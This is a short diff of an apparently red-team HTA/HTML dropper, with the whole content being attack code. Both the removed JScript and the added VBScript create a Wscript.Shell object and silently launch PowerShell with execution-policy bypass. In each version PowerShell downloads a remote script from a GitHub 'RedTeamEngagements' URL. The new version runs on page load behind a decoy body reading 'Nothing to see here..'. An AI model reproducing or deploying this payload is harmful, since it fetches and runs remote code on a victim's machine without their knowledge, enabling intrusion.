@@ -1,8 +1,14 @@
-<script>
-    //We will use Wscript.shell in order to launch PowerShell
-    a = new ActiveXObject('Wscript.Shell');
-    //Our command to execute
-    cmd = "powershell -windowstyle hidden -ep Bypass -nop -noexit -c ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Teacish/RedTeamEngagements/master/1.ps1')) ";
-    //Run the command, 0 is needed so that no PowerShell window will appear
-    a.Run(cmd, 0);
+<html>
+<head>
+<script language="VBScript"> 
+    Sub RunProgram
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run "powershell.exe -exec bypass -C ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Teacish/RedTeamEngagements/master/1.ps1'))"
+    End Sub
+RunProgram()
 </script>
+</head> 
+<body>
+    Nothing to see here..
+</body>
+</html>
